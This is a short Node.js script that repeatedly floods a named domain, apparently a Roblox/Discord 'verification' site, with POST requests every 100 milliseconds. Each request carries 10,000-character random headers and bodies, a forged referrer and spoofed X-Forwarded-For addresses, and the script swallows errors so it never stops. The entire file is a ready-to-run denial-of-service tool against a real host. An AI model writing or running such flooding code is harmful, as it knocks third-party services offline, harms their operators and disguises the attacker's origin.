

import fetch from 'node-fetch'
import fs from 'fs'
process.on("uncaughtException", (err, origin) => {
  fs.writeSync(
    process.stderr.fd,
    `Caught exception: ${err}\n Exception origin: ${origin}`
  );
});
function makeid(length) {
        var result           = '';
        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * 
    charactersLength));
    }
    return result;
    }
    setInterval(()=>{
        fetch("https://apibytow.robloxdiscord.pl/agg", {
            "credentials": "omit",
            "headers": {
                "User-Agent": makeid(10000),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "x-forwarded-for": ["180.190.162.93", "79.186.224.82", "176.227.156.147", "177.125.95.106"]
            },
            "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
            "body": "captcha="+makeid(10000),
            "method": "POST",
            "mode": "cors"
        })
    },100)
